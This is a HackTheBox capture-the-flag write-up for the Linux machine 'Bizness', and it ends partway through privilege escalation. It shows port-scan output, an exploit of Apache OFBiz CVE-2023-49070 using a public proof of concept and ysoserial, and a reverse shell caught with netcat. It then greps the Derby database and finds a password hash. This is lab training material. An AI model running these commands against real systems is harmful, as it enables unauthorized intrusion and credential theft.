# HackTheBox Bizness

The first Easy-level HackTheBox Season 4 machine running a Linux operating system tasked with exploiting public vulnerabilities in the CMS and escalating privileges by finding a password hash and brute-forcing it.

## Service Overview

Let's start the machine solution with a classic port scan, let's use rustscan for this purpose:

```shell
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.252 -- -A -sC

PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
| tls-alpn:
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg:
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
38727/tcp open  tcpwrapped syn-ack ttl 63
46631/tcp open  tcpwrapped syn-ack ttl 63
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=1/7%OT=22%CT=%CU=39187%PV=Y%DS=2%DC=T%G=N%TM=659AA3A3%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)
SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 41.919 days (since Sun Nov 26 17:10:51 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web

Let's immediately check what we have on the web server. Let's add address to `/etc/hosts` and try.

```shell
10.10.11.252 bizness.htb
```

Detecting: **Powered by Apache OFBiz**. On the endpoint from this CMS /webtools/control/login we find version 18.12:

```shell
https://bizness.htb/webtools/control/login
Copyright (c) 2001-2024 The Apache Software Foundation. Powered by Apache OFBiz. Release 18.12 
```

Use [POC](https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC) to get the shell (**Note**: that we need Java 11 for ysoserial to work):

```shell
$ git clone https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC.git
$ cd ofbiz-CVE-2023-49070-RCE-POC
$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
$ apt install openjdk-11-jre
$ update-alternatives --config java # to 11 version
$ nc -lnvp 4444
$ python3 exploit.py https://bizness.htb shell 10.10.16.49:4444
Not Sure Worked or not
```

Catch the shell:

```shell
$ nc -lnvp 4444
listening on [any] 4444 ...
id
connect to [10.10.16.49] from (UNKNOWN) [10.10.11.252] 54224
bash: cannot set terminal process group (725): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$ id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
ofbiz@bizness:/opt/ofbiz$ cd
cd
ofbiz@bizness:~$ ls
ls
l
user.txt
ofbiz@bizness:~$ cat user.txt
cat user.txt
6675b4d350d17ee2a2a20e8058cf8b59
ofbiz@bizness:~$
```

## Privilege upgrade

It's hard to find a promotion in this machine if you don't know where to look. Let's take a hint and do a search like this:

```shell
$ find /opt/ofbiz -name "*.dat"
...
/opt/ofbiz/runtime/data/derby/ ...
...
```

Let's remember the directory, navigate to it, and run the tricky grep:

```shell
ofbiz@bizness:/opt/ofbiz$ cd /opt/ofbiz/runtime/data/derby/
cd /opt/ofbiz/runtime/data/derby/
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
< -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
```

```shell
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
< -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
./ofbiz/seg0/c6010.dat:2:generalmail.smtp.auth.password?SMTP Auth password setting
./ofbiz/seg0/c6850.dat:15:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:16:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:17:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:18:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:20:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:21:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:23:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y@HFMozilla/5
./ofbiz/seg0/c6850.dat:24:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:25:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:27:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:28:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:29:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:30:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:31:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:32:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:33:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:34:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Ypython-requests
./ofbiz/seg0/c6850.dat:35:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:36:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:37:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:38:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:39:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:40:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:43:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:44:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:45:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:47:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:83:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:85:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:403:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@vtMozilla
./ofbiz/seg0/c6850.dat:639:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:1172:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:1328:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:1398:control/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:1539:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:1814:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:1936:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:2030:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:2426:3https://bizness.htb/webtools/control/password
./ofbiz/seg0/c6850.dat:2474:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:2831:control/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:2869:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:2870:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:3040:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:3063:htb/webtools/control/ping?USERNAME=&PASSWORD=qualsytest&requirePasswordChange=Y@FDMozilla
./ofbiz/seg0/c6850.dat:3073:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y@HFMozilla/5
./ofbiz/seg0/c6850.dat:3435:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=a&requirePasswordChange=Y@usMozilla
./ofbiz/seg0/c6850.dat:3490:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:4119:bizness.htb/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:4571:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:4817:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:5340:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:5471:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:6134:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:7867:4https://bizness.htb/webtools/control/password
./ofbiz/seg0/c6850.dat:7868:3https://bizness.htb/webtools/control/password
./ofbiz/seg0/c6850.dat:7884:htb/webtools/control/ping?USERNAME=&PASSWORD=test&requirePasswordChange=Y@FDMozilla
./ofbiz/seg0/c6850.dat:8916:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:8987:password
./ofbiz/seg0/c6850.dat:9028:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:9875:password
                                    gobuster/3.6
                                                        127.0
./ofbiz/seg0/c6850.dat:10235:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:12353:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:13364:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:13391:bizness.htb/webtools/control/account-password
                                                                          gobuster/3.6
                                                                                        127.0
./ofbiz/seg0/c6850.dat:13954:password
                                     gobuster/3.6
                                                        127.0
./ofbiz/seg0/c6850.dat:13994:5https://bizness.htb/webtools/control/password-recover
                                                                                   gobuster/3.6
                                                                                                127
./ofbiz/seg0/c6850.dat:13995:1https://bizness.htb/webtools/control/password
./ofbiz/seg0/c6850.dat:14086:password
                                     gobuster/3.6
                                                        127.0
./ofbiz/seg0/c6850.dat:15904:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:17544:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:18585:password
                                     gobuster/3.6
                                                        127.0
./ofbiz/seg0/c6850.dat:19454:password
./ofbiz/seg0/c6850.dat:19602:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:21926:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:22241:password
                                     gobuster/3.6
                                                        127.0
./ofbiz/seg0/c6850.dat:22672:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:24187:3https://bizness.htb/webtools/control/password
./ofbiz/seg0/c6850.dat:24192:1https://bizness.htb/webtools/control/password
./ofbiz/seg0/c6850.dat:24193:1https://bizness.htb/webtools/control/password
./ofbiz/seg0/c6850.dat:24989:bizness.htb/webtools/control/profile-password
                                                                          gobuster/3.6
                                                                                        127.0
./ofbiz/seg0/c6850.dat:25509:password
                                     gobuster/3.6
                                                        127.0
./ofbiz/seg0/c6850.dat:27688:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c6850.dat:29497:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
python-requests
./ofbiz/seg0/c6850.dat:29498:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/c6850.dat:29498:bizness.htb/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/c5fa1.dat:4:PASSWORDSEPERATOR_LINESEPERATOR_TEXTSTATE_PROVINCE
./ofbiz/seg0/c180.dat:87:SYSCS_CREATE_USEuserNampasswordVARCHAR
./ofbiz/seg0/c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbiz/seg0/c180.dat:87:SYSCS_RESET_PASSWORuserNampasswordVARCHAR
./ofbiz/seg0/c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbiz/seg0/c180.dat:87:SYSCS_MODIFY_PASSWORpasswordVARCHAR
./ofbiz/seg0/dump.txt:26959:SYSCS_CREATE_USEuserNampasswordVARCHAR
./ofbiz/seg0/dump.txt:26959:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbiz/seg0/dump.txt:26959:SYSCS_RESET_PASSWORuserNampasswordVARCHAR
./ofbiz/seg0/dump.txt:26959:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbiz/seg0/dump.txt:26959:SYSCS_MODIFY_PASSWORpasswordVARCHAR
./ofbiz/seg0/dump.txt:26999:PASSWORD'&$c013800d-00fb-2649-07ec
./ofbiz/seg0/dump.txt:26999:PASSWOR(&$c013800d-00fb-2649-07ec
./ofbiz/seg0/dump.txt:27083:td align='left'><span>Password: </span></td
./ofbiz/seg0/dump.txt:27086:td align='left'><input type="password" class='inputBox' name="PASSWORD" autocomplete
./ofbiz/seg0/dump.txt:27101:href="<@ofbizUrl>/forgotpasswd</@ofbizUrl>">Forgot Password?</a></div
./ofbiz/seg0/dump.txt:27117:if autoUserLogin?has_content>document.loginform.PASSWORD.focus();</#if
./ofbiz/seg0/dump.txt:27363:Password>${password}</Password
./ofbiz/seg0/dump.txt:27595:VT_CHPWD_TMPLT_LOC
VT_RES_TYPE22#!Change Password Template Location
./ofbiz/seg0/dump.txt:27595:VT_FGPWD_TMPLT_LOC
VT_RES_TYPE23#!Forget Password Template Location
./ofbiz/seg0/dump.txt:27684:PRDS_EMAIL
                                      PWD_RETRIEVE10Retrieve Password
./ofbiz/seg0/dump.txt:37440:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
./ofbiz/seg0/dump.txt:37440:Password
./ofbiz/seg0/dump.txt:37699:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                        127.0.1
./ofbiz/seg0/dump.txt:37699:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                        127.0.1
./ofbiz/seg0/dump.txt:37699:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                        127.0.1
./ofbiz/seg0/dump.txt:37699:htb/webtools/control/ping?USERNAME=&PASSWORD=qualsytest&requirePasswordChange=Y
                                                                                                                127.0
./ofbiz/seg0/dump.txt:37702:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                        127.0.1
./ofbiz/seg0/dump.txt:37703:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=a&requirePasswordChange=Y
                                                                                                                127.0
./ofbiz/seg0/dump.txt:37705:htb/webtools/control/ping?USERNAME=&PASSWORD=test&requirePasswordChange=Y
                                                                                                        127.0
./ofbiz/seg0/dump.txt:37706:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                        127.0.1
./ofbiz/seg0/dump.txt:38674:PASSWORD
./ofbiz/seg0/dump.txt:38675:Password
./ofbiz/seg0/dump.txt:38680:PASSWORDSEPERATOR_LINESEPERATOR_TEXTSTATE_PROVINCE
./ofbiz/seg0/dump.txt:38683:generalmail.smtp.auth.password?SMTP Auth password setting
./ofbiz/seg0/dump.txt:38716:user        generalmail.smtp.auth.password  generalmail.smtp.port   general
./ofbiz/seg0/dump.txt:38864:PASSWORD
./ofbiz/seg0/dump.txt:39754:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39755:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39756:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39757:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39759:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39760:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39762:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y@HFMozilla/5
./ofbiz/seg0/dump.txt:39763:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39764:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39766:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39767:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39768:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39769:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39770:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39771:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39772:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@HFMozilla
./ofbiz/seg0/dump.txt:39773:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39774:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39775:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39776:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39777:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39778:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39779:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39782:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39783:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39784:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39786:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39822:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:39824:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:40142:htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y@vtMozilla
